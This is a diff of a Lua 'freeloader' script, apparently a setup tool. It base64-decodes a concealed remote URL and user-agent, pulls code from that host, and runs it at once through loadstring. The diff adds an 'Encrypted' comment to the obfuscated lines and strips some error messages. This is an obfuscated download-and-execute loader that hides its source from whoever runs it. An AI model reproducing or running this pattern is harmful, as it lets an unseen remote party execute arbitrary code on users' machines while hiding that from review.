@@ -1,5 +1,5 @@
 -- =============================================================
--- 🚀 SCLOUDS-OMNI v12 - FREELOADER
+-- 🚀 SCLOUDS-OMNI v10 - FREELOADER (WITHOUT INPUT)
 -- =============================================================
 
 local function decode(str)
@@ -15,6 +15,7 @@ local function decode(str)
     end))
 end
 
+-- URL & UA Encrypted
 local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
 local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")
 
@@ -24,14 +25,11 @@ if pipe then
     pipe:close()
     
     if content and content ~= "" then
-        local run, err = (loadstring or load)(content)
-        
+        local run = loadstring(content)
         if run then
-            run() -- Run The Freeloader.sh
+            run()
         else
-            print("\27[31m[ERROR]\27[0m Failed To Load Freeloader.sh: " .. tostring(err))
+            print("\27[31m[ERROR]\27[0m Failed To Load Encryption Files.")
         end
-    else
-        print("\27[31m[ERROR]\27[0m Server Respond : Zero.")
     end
 end
